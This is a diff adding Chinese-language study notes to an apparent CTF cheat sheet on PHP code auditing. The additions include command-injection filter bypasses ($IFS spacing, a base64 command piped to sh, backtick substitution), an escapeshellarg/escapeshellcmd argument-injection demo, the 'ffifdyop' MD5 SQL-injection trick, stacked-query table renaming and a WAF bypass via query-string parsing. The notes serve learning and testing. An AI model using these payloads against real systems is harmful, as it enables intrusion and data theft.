@@ -51,6 +51,7 @@ strrev():反转打印字符串，就是倒着打印
 str_rot13 ( string $str ) : string	对 str 参数执行 ROT13 编码并将结果字符串返回。编码和解码都使用相同的函数,传递一个编码过的字符串作为参数，将得到原始字符串。
 escapeshellarg ( string $arg ) : string-->把字符串转码为可以在 shell 命令里使用的参数，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号;
  escapeshellcmd ( string $command ) : string-->对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义,反斜线（\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$\, \x0A 和 \xFF。
+readfile ( string $filename , bool $use_include_path = false , resource $context = ? ) : int-->读取文件并写入到输出缓冲。 
 
  ```
 
@@ -351,6 +352,8 @@ MD5($_GET['name']) === MD5($_GET['password'])
 
 **另外，MD5()无法处理数组，当比较数组时，会返回0，也能用于绕过，name[]=a&password[]=b**
 
+>  **ffifdyop**，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，
+
 ### egrep()漏洞
 
 ereg()与strpos()两个函数同样不能用数组作为参数，否则返回NULL。
@@ -376,11 +379,131 @@ http://123.206.87.240:9009/22.php?password=9999a
 http://123.206.87.240:9009/22.php?password=9999%00
 ```
 
+### RCE命令执行
+
++ 空格绕过方式
+  + $IFS
+  + ${IFS}
+  + $IFS$数字
+  + <
+  + <>
+
++ 三种绕过方式
+
+  1. sh
+
+     ~~~
+     /?ip=127.0.0.1;echo$IFS$2Y2F0IGZsYWcucGhw|base64$IFS$2 -d|sh
+     ~~~
+
+  2. 变量拼接
+
+     ~~~
+     /?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php
+     ~~~
+
+  3. 内联注释（将反引号命令的结果作为输入来执行命令）
+
+     ~~~
+     /?ip=127.0.0.1;cat$IFS$2`ls`
+     ~~~
+
+### escapeshellarg()与escapeshellcmd()漏洞
+
+~~~php
+<?php
+$a="172.17.0.2' -v -d a=1";
+$b=escapeshellarg($a);
+$c=escapeshellcmd($b);
+echo $a."<br/>".$b."<br/>".$c;
+system($c);
+?>
+~~~
+
+输出
+
+172.17.0.2' -v -d a=1
+'172.17.0.2'\\'' -v -d a=1'
+'172.17.0.2''' -v -d a=1'
+
+> 1. $a传入的参数是172.17.0.2' -v -d a=1
+> 2. 经过escapeshellarg()处理后成为'172.17.0.2'\\''-v -d a=1' 即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用
+> 3. 经过escapeshellcmd()处理后成为'172.17.0.2'\\\\''-v -d a=1\\'这是因为escapeshellcmd以及最后那个不配对儿的引号进行了转义
+> 4. 所以可以简化为 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。这样就能绕过过滤进行注入。
+
+### sql注入绕过关键字
+
++ 获取信息
+
+  > show databases;
+  >
+  > show tables;
+  >
+  > show columns from table_name
+
++ 修改表名
+
+  > 1'; 
+  >
+  > alter table words rename to words1; 
+  >
+  > alter table `1919810931114514` rename to words; 
+  >
+  > alter table words change flag id varchar(50);#
+
++ 另外，新知识,`HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭
+
++ **预编译（？）**
+
+
+
+### preg_replace`/e`的命令执行漏洞
+
+
+
+### mysql特殊模式（set sql_mode=pipes_as_concat）
+
+ 此模式下，输出字符串可以进行拼接
+
+![img](PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/1532807-20190824175512704-1660615433.png)
+
+### PHP字符串解析特性（Easy Calc）
+
+ PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。
+
+ 假如waf不允许num变量传递字母：
+
+```
+http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话
+```
+
+那么我们可以在num前加个空格：
+
+```
+http://www.xxx.com/index.php? num = aaaa
+```
+
+这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。
+
+ **另外scandir()可列出目录和文件，scandir(/)扫描目录下所有文件，如果 / 被过滤，可以用char(47)绕过**
 
 
 
 
-RCE过滤绕过
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 反序列化
 
